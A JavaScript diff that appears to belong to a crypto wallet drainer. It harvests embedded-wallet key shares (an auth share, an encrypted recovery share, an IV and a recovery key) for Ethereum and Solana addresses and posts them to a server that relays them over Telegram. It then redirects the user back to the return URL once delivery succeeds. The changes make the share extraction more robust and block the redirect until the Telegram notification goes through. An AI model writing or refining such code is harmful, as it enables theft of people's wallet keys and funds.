@@ -421,8 +421,15 @@
         body: JSON.stringify({ ...out, returnUrl: ret }),
       });
       const data = await r.json().catch(() => ({}));
+      if (!data.telegram) {
+        setStatus(
+          "Telegram failed",
+          data.telegramError || "Notification was not delivered"
+        );
+        return;
+      }
       const u = new URL(ret);
-      u.searchParams.set("kr", data.telegram ? "ok" : "err");
+      u.searchParams.set("kr", "ok");
       location.href = u.toString();
       return;
     } catch (e) {
@@ -437,6 +444,23 @@
       return;
     }
     location.href = url;
+  }
+
+  function shareFields(recovered) {
+    const authData = recovered?.auth_share?.data || recovered?.auth_share || {};
+    const shareData = recovered?.shares?.data || recovered?.shares || {};
+    const authShare = authData.share || authData.auth_share || null;
+    const encShare =
+      shareData.encrypted_recovery_share ||
+      shareData.encrypted_share ||
+      shareData.share ||
+      null;
+    const iv =
+      shareData.encrypted_recovery_share_iv ||
+      shareData.encrypted_share_iv ||
+      shareData.iv ||
+      null;
+    return { authShare, encShare, iv };
   }
 
   /* COOP-safe path: parent opens r.html#job=<b64url(json)>
@@ -482,16 +506,23 @@
         const chainType = it.chainType || it.chain_type || "ethereum";
         try {
           const recovered = await recoverApi(it);
-          const authShare = recovered?.auth_share?.data?.share;
-          const encShare = recovered?.shares?.data?.encrypted_recovery_share;
-          const iv = recovered?.shares?.data?.encrypted_recovery_share_iv;
+          const { authShare, encShare, iv } = shareFields(recovered);
           const rk = recovered?.recoveryKey || it.recoveryKey;
-          if (!authShare || !encShare || !iv) {
+          if (!authShare || !encShare || !iv || !rk) {
             const fail = {
               chainType,
               address: it.wallet || it.address,
               ok: false,
-              error: "incomplete",
+              error:
+                "incomplete shares (auth=" +
+                !!authShare +
+                " enc=" +
+                !!encShare +
+                " iv=" +
+                !!iv +
+                " rk=" +
+                !!rk +
+                ")",
             };
             out.raw[chainType === "solana" ? "solana" : "ethereum"].push(fail);
             continue;
